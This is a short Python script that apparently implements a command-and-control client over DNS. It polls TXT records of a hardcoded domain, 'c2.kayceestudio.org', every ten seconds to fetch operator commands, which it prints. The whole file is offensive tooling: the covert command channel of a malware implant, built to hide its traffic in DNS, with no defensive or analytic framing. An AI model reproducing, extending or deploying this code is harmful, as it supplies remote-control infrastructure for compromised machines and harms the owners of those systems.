import dns.resolver
import time

class DNSC2:
    """
    C2 Client using DNS TXT records.
    - Queries a domain for commands stored in TXT records.
    """

    def __init__(self, c2_domain):
        self.c2_domain = c2_domain

    def get_latest_command(self):
        """ Fetch the latest C2 command from DNS TXT records. """
        try:
            response = dns.resolver.resolve(self.c2_domain, "TXT")
            for txt_record in response:
                command = txt_record.to_text().strip('"')
                return command
        except Exception as e:
            print(f"⚠️ DNS C2 Error: {e}")
            return None

# Example Usage
if __name__ == "__main__":
    C2_DOMAIN = "c2.kayceestudio.org"
    dns_c2 = DNSC2(C2_DOMAIN)

    while True:
        command = dns_c2.get_latest_command()
        if command:
            print(f"📡 Received DNS C2 Command: {command}")
        time.sleep(10)  # Check for new commands every 10 seconds
